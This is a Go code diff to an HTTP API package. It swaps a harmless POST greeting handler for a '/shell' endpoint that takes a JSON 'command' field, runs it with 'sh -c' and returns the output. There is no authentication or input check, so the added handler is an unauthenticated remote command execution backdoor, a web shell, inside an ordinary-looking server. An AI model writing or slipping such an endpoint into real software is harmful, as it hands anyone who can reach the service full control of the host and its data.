@@ -1,9 +1,12 @@
 package api
 
 import (
+	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
+	"os/exec"
 )
 
 type API struct {
@@ -11,6 +14,10 @@ type API struct {
 	Host string
 	Port int
 	log  *log.Logger
+}
+
+type Shell struct {
+	Command string `json:"command"`
 }
 
 func New(host string, port int, logger *log.Logger) *API {
@@ -24,17 +31,49 @@ func New(host string, port int, logger *log.Logger) *API {
 }
 
 func (api *API) initRoutes() {
-	http.HandleFunc("/", api.helloHandler)
+	http.HandleFunc("/shell", api.shellHandler)
 }
 
-func (api *API) helloHandler(w http.ResponseWriter, r *http.Request) {
+func (api *API) shellHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
 		return
 	}
 
-	// Handle the POST request
-	fmt.Fprintf(w, "Hello, you've posted: %s\n", r.URL.Path)
+	// Parse the command from the request body
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
+		return
+	}
+	defer r.Body.Close() // Close the request body
+
+	// Unmarshal the request body into a Shell struct
+	var shell Shell
+	if err := json.Unmarshal(body, &shell); err != nil {
+		http.Error(w, "Failed to parse request body", http.StatusBadRequest)
+		return
+	}
+
+	// Execute the command
+	cmd := exec.Command("sh", "-c", shell.Command)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		// Check if the command failed because it was not found
+		if exitError, ok := err.(*exec.ExitError); ok {
+			if exitError.ExitCode() == 127 {
+				http.Error(w, "Command not found", http.StatusNotFound)
+				return
+			}
+		}
+		// Return a generic error if the command execution failed
+		http.Error(w, "Failed to execute command", http.StatusInternalServerError)
+		return
+	}
+
+	// Write the command output to the response
+	fmt.Fprintf(w, "Command output:\n%s\n", output)
+
 }
 
 func (api *API) ServeHTTP(w http.ResponseWriter, r *http.Request) {
